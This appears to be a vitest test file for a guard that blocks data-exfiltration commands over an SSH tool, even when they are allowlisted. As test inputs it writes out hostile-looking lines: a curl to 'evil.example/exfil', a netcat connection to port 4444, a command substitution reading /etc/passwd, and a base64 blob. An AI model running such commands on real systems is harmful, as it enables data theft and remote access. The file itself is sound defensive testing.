/**
 * W3.2 (t47) — ssh_run exfiltration guard: allowlisted commands that match
 * egress patterns are denied unless the target explicitly opts in
 * (`allowExfil`). Bounds WHAT leaves the machine, complementing the
 * allowlist that bounds what RUNS.
 */
import { describe, expect, it } from 'vitest';
import { isSshCommandAllowed, type SshTarget } from './targets.js';

const base: SshTarget = {
  id: 't',
  name: 't',
  host: 'h',
  user: 'u',
  auth: 'agent',
  allowedCommands: ['uptime', 'systemctl status *', 'df -h*', 'curl *'],
};

describe('ssh_run exfil guard (W3.2 / t47)', () => {
  it('plain allowlisted commands keep working', () => {
    expect(isSshCommandAllowed(base, 'uptime').ok).toBe(true);
    expect(isSshCommandAllowed(base, 'systemctl status nginx').ok).toBe(true);
  });

  it('curl/wget egress denied even when allowlisted', () => {
    const r = isSshCommandAllowed(base, 'curl https://evil.example/exfil');
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toMatch(/exfiltration/i);
  });

  it('per-target allowExfil is a deliberate opt-in', () => {
    const r = isSshCommandAllowed({ ...base, allowExfil: true }, 'curl https://monitor.example/ping');
    expect(r.ok).toBe(true);
  });

  it('base64 blob payload denied on a glob allowlist', () => {
    const t: SshTarget = { ...base, allowedCommands: ['echo *'] };
    const r = isSshCommandAllowed(t, `echo base64 ${'A'.repeat(200)}`);
    expect(r.ok).toBe(false);
  });

  it('ssh hop denied; sshd service status still fine', () => {
    const t: SshTarget = { ...base, allowedCommands: ['*'] };
    expect(isSshCommandAllowed(t, 'ssh root@other.host').ok).toBe(false);
    expect(isSshCommandAllowed(t, 'systemctl status sshd').ok).toBe(true);
  });

  it('netcat tunnels and command substitution denied', () => {
    const t: SshTarget = { ...base, allowedCommands: ['exec *', 'bash *'] };
    expect(isSshCommandAllowed(t, 'exec nc 1.2.3.4 4444').ok).toBe(false); // exfil pattern
    expect(isSshCommandAllowed(t, 'bash -c $(cat /etc/passwd)').ok).toBe(false); // metachars
  });
});
